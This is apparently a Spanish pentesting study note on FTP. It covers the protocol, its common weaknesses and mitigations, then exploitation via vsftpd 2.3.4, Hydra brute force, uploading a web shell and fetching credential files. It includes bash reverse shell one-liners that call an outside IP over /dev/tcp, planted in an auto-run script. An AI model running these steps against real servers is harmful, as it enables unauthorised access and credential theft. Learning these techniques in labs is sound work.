
---
**Definición:**  
Protocolo usado para **transferir archivos** entre un cliente y un servidor en una red TCP/IP. Funciona por defecto en el **puerto 21** y permite subir, descargar o gestionar archivos. No cifra la información por sí mismo.

---
### **Vulnerabilidades comunes:**

- **Sin cifrado:** las credenciales viajan en texto plano.
- **Acceso anónimo:** puede exponer archivos sensibles.
- **Fuerza bruta:** contraseñas débiles pueden ser adivinadas.
- **Enumeración de archivos:** permite listar directorios.
- **Man-in-the-Middle:** posible interceptación de datos.

✅ **Mitigación:** usar **FTPS o SFTP**, desactivar acceso anónimo y emplear contraseñas seguras.


---
### Explotación y Vulnerabilidades Comunes

#### vsftpd 2.3.4

- Se puede explotar mediante el escaneo de vulnerabilidades de [[Nmap]] , se puede setear su exploit en [[Metasploit]]

![[Pasted image 20251018143545.png]]

#### Hydra

- Generalmente es susceptible a ataques de fuerza bruta empleando [[Hydra]] 

--- 
#### Ingreso con usuario Proporcionado

```bash
ftp <Ipvictima>  # Iniciamos sesion por ftp , el Usuario que pediran lo normal es que sea anonymous y la contraseña vacia (ENTER)
ftp > 
	put shell.aspx # Subimos la shell a los archivos del sitio web
	get credenciales.txt # Descargar cualquier archivo 
```


- Iniciando con usuario proporcionado si vemos que se esta ejecutando automáticamente un script de bash, podemos copiarle el codigo de una reverse shell para que se autoejecute, el que funciona es el siguiente

*Tener en cuenta no eliminar el archivo que esta sino que solo con el comando put poner el nuevo y asi solo editar*
```bash

#!/bin/bash
 
sh -i >& /dev/tcp/10.23.197.56/443 0>&1          # Esta en la reverse shell comun

bash -i >& /dev/tcp/10.23.197.56/443 0>&1        # Este es el codigo que normalmente se ejecuta si no se tiene instalado en el servidor victima                                                  la primera 

```